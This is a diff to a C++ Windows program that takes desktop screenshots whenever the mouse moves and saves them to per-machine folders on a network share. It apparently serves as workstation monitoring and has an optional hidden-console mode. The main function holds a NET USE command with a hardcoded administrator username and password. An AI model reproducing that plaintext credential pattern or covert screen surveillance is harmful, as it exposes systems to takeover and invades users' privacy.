@@ -11,6 +11,8 @@
 using namespace std;
 int mouse2;//滑鼠數值容器
 static CString Path = L"\\\\10.224.22.219\\Screen\\"; //檔案路徑變數
+static TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
+static DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
 
 //隱藏console
 void HideConsole()
@@ -20,8 +22,6 @@ void HideConsole()
 
 //創建時間資料夾拍攝桌面存入
 void scrshot() {
-	TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
-	DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
 	GetComputerName(szBuffer, &dwSize); //Get the computer name
 	CString PCName = szBuffer;//PC名稱變數
 	CImage image;//加入圖像模塊
@@ -50,10 +50,9 @@ void scrshot() {
 	HDC hdc = GetWindowDC(hwnd);
 	HDC hdcMem = CreateCompatibleDC(hdc);
 	HBITMAP hbitmap(NULL);
-	int width = 3840;
-	int heigth = 1080;
-	//int width = GetDeviceCaps(hdc, HORZRES);// 螢幕圖片寬度
-	//int heigth = GetDeviceCaps(hdc, VERTRES);// 螢幕圖片高度
+	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);//虛擬畫面寬度
+	int heigth = GetSystemMetrics(SM_CYVIRTUALSCREEN);//虛擬畫面高度
+
 	hbitmap = CreateCompatibleBitmap(hdc, width, heigth);
 	SelectObject(hdcMem, hbitmap);
 	BitBlt(hdcMem, 0, 0, width, heigth, hdc, 0, 0, SRCCOPY);
@@ -99,12 +98,20 @@ void scrshot() {
 	printf("Y: %lu ", pt.y);
 }
 
-//偵測滑鼠移動
-int mouseposition() {
+//X偵測滑鼠移動
+int Xmouseposition() {
 	POINT pt;//滑鼠座標指令
 	BOOL bReturn = GetCursorPos(&pt);//滑鼠座標回傳確認變數
 	int x = pt.x;
 	return x;
+}
+
+//Y偵測滑鼠移動
+int Ymouseposition() {
+	POINT pt;//滑鼠座標指令
+	BOOL bReturn = GetCursorPos(&pt);//滑鼠座標回傳確認變數
+	int y = pt.y;
+	return y;
 }
 
 //主程式
@@ -112,13 +119,9 @@ int main()
 {
 	//HideConsole();隱藏
 	system("NET USE \\\\10.224.22.219 /user:fileserver19\\administrator !qaz2wsx");//登入NAS取的存取權限
-	TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
-	DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
 	GetComputerName(szBuffer, &dwSize); //Get the computer name
 	CString PCName = szBuffer;//PC名稱變數
 	CString Totlename = Path + PCName;//電腦名稱資料夾位置
-	//CT2CA pszConvertedAnsiString(Totlename);//型別轉換CString to string
-	//std::string folder(pszConvertedAnsiString);
 	CW2A pszConvertedAnsichar(Totlename);//型別轉換CString to char
 	//判斷電腦名稱資料夾是否存在不存在自動創建
 	if (_mkdir(pszConvertedAnsichar) == 0)
@@ -133,10 +136,12 @@ int main()
 	//判斷使用者是否動作呼叫scrshot函數
 	while (true)
 	{
-		int mouse1 = mouseposition();
+		int Xmouse1 = Xmouseposition();
+		int Ymouse1 = Ymouseposition();
+		int mouse1 = Xmouse1 + Ymouse1;
 		if (mouse1 == mouse2)
 		{
-			printf("\nSTOP");
+			printf("\nSTOP at:");
 			printf("%d", mouse1);
 			Sleep(1000);
 		}
